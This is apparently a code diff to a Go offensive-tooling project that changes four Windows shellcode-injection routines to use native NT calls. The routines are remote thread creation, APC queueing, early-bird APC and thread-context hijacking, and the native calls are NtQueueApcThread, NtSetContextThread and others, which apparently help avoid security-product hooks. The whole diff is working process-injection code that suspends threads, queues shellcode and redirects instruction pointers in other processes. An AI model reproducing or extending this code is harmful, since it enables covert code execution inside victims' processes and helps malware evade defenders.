@@ -194,10 +194,14 @@ func (w *windowsSyscallInjector) injectCT(shellcode []byte) error {
 		return fmt.Errorf("NtCreateThreadEx: NTSTATUS 0x%X: %w", uint32(r), err)
 	}
 
-	// NOTE: WaitForSingleObject does not support context.Context cancellation.
-	// The Windows API has no interruptible wait that accepts a Go context.
-	// The 100ms timeout bounds the blocking duration.
-	api.ProcWaitForSingleObject.Call(hThread, 100)
+	// NtWaitForSingleObject with 100ms relative timeout.
+	// Negative LARGE_INTEGER = relative time in 100ns intervals.
+	timeout := int64(-100 * 10000) // 100ms
+	w.caller.Call("NtWaitForSingleObject",
+		hThread,
+		0, // Alertable = FALSE
+		uintptr(unsafe.Pointer(&timeout)),
+	)
 	windows.CloseHandle(windows.Handle(hThread))
 	return nil
 }
@@ -247,12 +251,24 @@ func (w *windowsSyscallInjector) injectAPC(shellcode []byte) error {
 			continue
 		}
 
-		count, _, _ := api.ProcSuspendThread.Call(uintptr(hThread))
-		apcRet, _, _ := api.ProcQueueUserAPC.Call(addr, uintptr(hThread), 0)
+		var prevCount uint32
+		r, _ := w.caller.Call("NtSuspendThread",
+			uintptr(hThread),
+			uintptr(unsafe.Pointer(&prevCount)),
+		)
+		suspended := r == 0
+
+		apcR, _ := w.caller.Call("NtQueueApcThread",
+			uintptr(hThread),
+			addr,
+			0, 0, 0,
+		)
+		apcOK := apcR == 0
+
 		windows.ResumeThread(hThread)
 		windows.CloseHandle(hThread)
 
-		if apcRet != 0 && count != 0xFFFFFFFF {
+		if apcOK && suspended {
 			success = true
 			break
 		}
@@ -301,10 +317,14 @@ func (w *windowsSyscallInjector) injectEarlyBird(shellcode []byte) error {
 		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
 
-	apcRet, _, _ := api.ProcQueueUserAPC.Call(addr, uintptr(pi.Thread), 0)
-	if apcRet == 0 {
+	apcR, err := w.caller.Call("NtQueueApcThread",
+		uintptr(pi.Thread),
+		addr,
+		0, 0, 0,
+	)
+	if apcR != 0 {
 		windows.TerminateProcess(pi.Process, 1)
-		return fmt.Errorf("QueueUserAPC failed")
+		return fmt.Errorf("NtQueueApcThread: NTSTATUS 0x%X: %w", uint32(apcR), err)
 	}
 
 	_, err = windows.ResumeThread(pi.Thread)
@@ -355,18 +375,24 @@ func (w *windowsSyscallInjector) injectThreadHijack(shellcode []byte) error {
 	var ctx context64
 	ctx.ContextFlags = contextFull
 
-	retGet, _, _ := api.ProcGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
-	if retGet == 0 {
+	r, err := w.caller.Call("NtGetContextThread",
+		uintptr(pi.Thread),
+		uintptr(unsafe.Pointer(&ctx)),
+	)
+	if r != 0 {
 		windows.TerminateProcess(pi.Process, 1)
-		return fmt.Errorf("GetThreadContext failed")
+		return fmt.Errorf("NtGetContextThread: NTSTATUS 0x%X: %w", uint32(r), err)
 	}
 
 	ctx.Rip = uint64(addr)
 
-	retSet, _, _ := api.ProcSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
-	if retSet == 0 {
+	r, err = w.caller.Call("NtSetContextThread",
+		uintptr(pi.Thread),
+		uintptr(unsafe.Pointer(&ctx)),
+	)
+	if r != 0 {
 		windows.TerminateProcess(pi.Process, 1)
-		return fmt.Errorf("SetThreadContext failed")
+		return fmt.Errorf("NtSetContextThread: NTSTATUS 0x%X: %w", uint32(r), err)
 	}
 
 	windows.ResumeThread(pi.Thread)
